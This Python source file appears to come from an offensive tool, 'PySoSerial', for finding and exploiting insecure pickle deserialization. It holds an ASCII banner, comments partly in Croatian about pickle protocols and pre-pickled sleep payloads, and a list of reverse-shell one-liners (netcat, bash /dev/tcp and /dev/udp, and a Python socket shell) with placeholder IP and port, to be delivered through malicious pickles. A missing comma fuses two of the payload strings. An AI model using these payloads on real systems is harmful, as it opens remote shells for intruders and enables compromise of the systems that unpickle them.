


banner = """


██████╗░██╗░░░██╗░██████╗░█████╗░░██████╗███████╗██████╗░██╗░█████╗░██╗
██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║
██████╔╝░╚████╔╝░╚█████╗░██║░░██║╚█████╗░█████╗░░██████╔╝██║███████║██║
██╔═══╝░░░╚██╔╝░░░╚═══██╗██║░░██║░╚═══██╗██╔══╝░░██╔══██╗██║██╔══██║██║
██║░░░░░░░░██║░░░██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║██║██║░░██║███████╗
╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝
                                                                                                        

[+] Tool for identification and exploitation of insecure deserialization vulnerabilities in python

"""


reverse_shells = [
"nc -e /bin/sh ip_placeholder port_placeholder",              # netcat
"nc -e /bin/bash ip_placeholder port_placeholder",
"nc -c bash ip_placeholder port_placeholder",
"bash -i >& /dev/tcp/ip_placeholder/port_placeholder 0>&1",   # bash TCP
"/bin/bash -l > /dev/tcp/ip_placeholder/port_placeholder 0<&1 2>&1",
"sh -i >& /dev/udp/ip_placeholder/port_placeholder 0>&1"      # bash UDP
"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip_placeholder\",port_placeholder));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
]


#TODO: sve picklati sa razlicitim verzijama pickle protokola


"""
SA SUBRPOCESS NIJE TAKO!!!!!!!!!!!!, koristiti subprocess umjesto os.sysyem?
"""

""" 
previously constructed payloads calling sleep [3,7] seconds
each payload is pickled with all 6 pickle protocols and base64 encoded

these are not generated on the fly for two reasons:
    1) efficiency
    2) considering that executing command relies on importing os module
       paylods differ on different operating systems
         - pickle payloads generated on linux will execute only if unpickling on linux aswell
         - the same goes for windows


"""


prepickled = []

win_sleep_prepickled = [
    # sleep 5
]


nix_sleep_prepickled = [
    # sleep 5
]
